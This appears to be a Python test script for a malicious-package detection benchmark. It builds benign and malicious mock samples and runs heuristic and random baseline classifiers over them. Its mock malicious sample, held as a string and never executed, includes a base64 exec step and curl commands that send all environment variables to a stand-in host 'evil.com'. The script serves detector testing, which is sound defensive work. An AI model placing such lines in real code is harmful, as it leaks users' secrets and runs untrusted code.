#!/usr/bin/env python3
"""
Test script to verify ICN benchmark framework functionality.
Tests framework components without requiring full model training.
"""

import asyncio
import logging
import sys
from pathlib import Path

# Add ICN to path
sys.path.append(str(Path(__file__).parent))

from icn.evaluation.benchmark_framework import (
    BenchmarkSuite, BaselineModel, BenchmarkSample
)
from icn.evaluation.openrouter_client import OpenRouterClient, BenchmarkRequest
from icn.training.losses import SampleType


def setup_logging():
    """Setup basic logging."""
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )


def create_mock_benchmark_samples(n_samples: int = 10) -> list:
    """Create mock benchmark samples for testing."""
    samples = []
    
    # Create mix of benign and malicious samples
    for i in range(n_samples):
        is_malicious = i % 2 == 1  # Alternate between benign/malicious
        
        if is_malicious:
            # Mock malicious package content
            content = f"""
# Malicious Package Example {i}
import os
import base64
import subprocess

def malicious_function():
    # Suspicious network activity
    os.system("curl http://malicious-site.com/steal-data")
    
    # Base64 encoded payload
    payload = base64.b64decode("bWFsaWNpb3VzX3BheWxvYWQ=")
    exec(payload)
    
    # Environment variable extraction
    secrets = os.environ
    subprocess.run(["curl", "-X", "POST", "http://evil.com", "-d", str(secrets)])

print("Installing package...")
malicious_function()
"""
            sample_type = "malicious_intent"
            ground_truth = 1
        else:
            # Mock benign package content
            content = f"""
# Benign Package Example {i}
import json
import math

def calculate_statistics(data):
    '''Calculate basic statistics for a dataset.'''
    if not data:
        return None
    
    total = sum(data)
    mean = total / len(data)
    variance = sum((x - mean) ** 2 for x in data) / len(data)
    std_dev = math.sqrt(variance)
    
    return {{
        'mean': mean,
        'variance': variance,
        'std_dev': std_dev,
        'min': min(data),
        'max': max(data)
    }}

def save_results(results, filename):
    '''Save results to JSON file.'''
    with open(filename, 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"Results saved to {{filename}}")
"""
            sample_type = "benign"
            ground_truth = 0
        
        sample = BenchmarkSample(
            package_name=f"test-package-{i}",
            ecosystem="npm" if i % 2 == 0 else "pypi",
            sample_type=sample_type,
            ground_truth_label=ground_truth,
            raw_content=content,
            file_paths=[f"test-package-{i}/index.js"],
            package_size_bytes=len(content),
            num_files=1,
            metadata={"test_sample": True}
        )
        
        samples.append(sample)
    
    return samples


async def test_baseline_models():
    """Test baseline model functionality."""
    print("\n🧪 Testing Baseline Models...")
    
    samples = create_mock_benchmark_samples(5)
    
    # Test heuristic baseline
    heuristic_model = BaselineModel("Test_Heuristic", "heuristic")
    
    results = []
    for sample in samples:
        result = await heuristic_model.predict(sample)
        results.append(result)
        
        print(f"   Sample: {sample.package_name}")
        print(f"   Ground truth: {sample.ground_truth_label}")
        print(f"   Prediction: {result.prediction} (confidence: {result.confidence:.3f})")
        print(f"   Success: {result.success}")
        print()
    
    # Calculate accuracy
    correct = sum(1 for r, s in zip(results, samples) 
                 if r.success and r.prediction == s.ground_truth_label)
    accuracy = correct / len(results)
    
    print(f"✅ Heuristic model accuracy: {accuracy:.3f} ({correct}/{len(results)})")
    return True


async def test_openrouter_client():
    """Test OpenRouter client (without making actual API calls)."""
    print("\n🧪 Testing OpenRouter Client...")
    
    try:
        # Test client initialization
        client = OpenRouterClient()
        
        print("✅ OpenRouter client initialized")
        print(f"   Available models: {len(client.get_available_models())}")
        
        # Show some model info
        for model_name in list(client.get_available_models())[:3]:
            model_info = client.get_model_info(model_name)
            print(f"   {model_name}: {model_info.description}")
        
        return True
        
    except Exception as e:
        print(f"⚠️  OpenRouter client test skipped: {e}")
        return False


async def test_benchmark_suite():
    """Test the complete benchmark suite."""
    print("\n🧪 Testing Benchmark Suite...")
    
    # Create benchmark suite
    benchmark = BenchmarkSuite(output_dir="test_results")
    
    # Load mock samples
    samples = create_mock_benchmark_samples(8)
    benchmark.load_samples(samples)
    
    # Register baseline models
    heuristic_model = BaselineModel("Heuristic", "heuristic")
    random_model = BaselineModel("Random", "random")
    
    benchmark.register_model(heuristic_model)
    benchmark.register_model(random_model)
    
    print(f"✅ Benchmark suite setup complete")
    print(f"   Models: {len(benchmark.models)}")
    print(f"   Samples: {len(benchmark.samples)}")
    
    # Run benchmark
    print("🚀 Running benchmark...")
    results_df = await benchmark.run_benchmark(max_concurrent=2)
    
    print(f"✅ Benchmark completed")
    print(f"   Results shape: {results_df.shape}")
    
    # Compute metrics
    metrics = benchmark.compute_metrics()
    
    print("📊 Metrics computed:")
    for model_name, model_metrics in metrics.items():
        f1_key = f"{model_name}_f1"
        if f1_key in model_metrics:
            print(f"   {model_name} F1: {model_metrics[f1_key]:.3f}")
    
    # Generate and save report
    report = benchmark.generate_report()
    benchmark.save_results("test_benchmark_results.json")
    
    print("✅ Benchmark suite test completed successfully")
    return True


async def main():
    """Run all tests."""
    setup_logging()
    
    print("🧪 ICN Benchmark Framework Test Suite")
    print("=" * 50)
    
    tests_passed = 0
    total_tests = 3
    
    # Test 1: Baseline Models
    try:
        if await test_baseline_models():
            tests_passed += 1
    except Exception as e:
        print(f"❌ Baseline models test failed: {e}")
        import traceback
        traceback.print_exc()
    
    # Test 2: OpenRouter Client
    try:
        if await test_openrouter_client():
            tests_passed += 1
    except Exception as e:
        print(f"❌ OpenRouter client test failed: {e}")
    
    # Test 3: Benchmark Suite
    try:
        if await test_benchmark_suite():
            tests_passed += 1
    except Exception as e:
        print(f"❌ Benchmark suite test failed: {e}")
        import traceback
        traceback.print_exc()
    
    # Summary
    print("\n" + "=" * 50)
    print(f"🎯 Test Results: {tests_passed}/{total_tests} tests passed")
    
    if tests_passed == total_tests:
        print("✅ All tests passed! Benchmark framework is ready.")
        print("\nNext steps:")
        print("1. Train ICN model: python train_icn.py")
        print("2. Set OPENROUTER_API_KEY environment variable")
        print("3. Run full benchmark: python run_icn_benchmark.py --quick-test")
    else:
        print("⚠️  Some tests failed. Review errors above.")
    
    print("=" * 50)


if __name__ == "__main__":
    asyncio.run(main())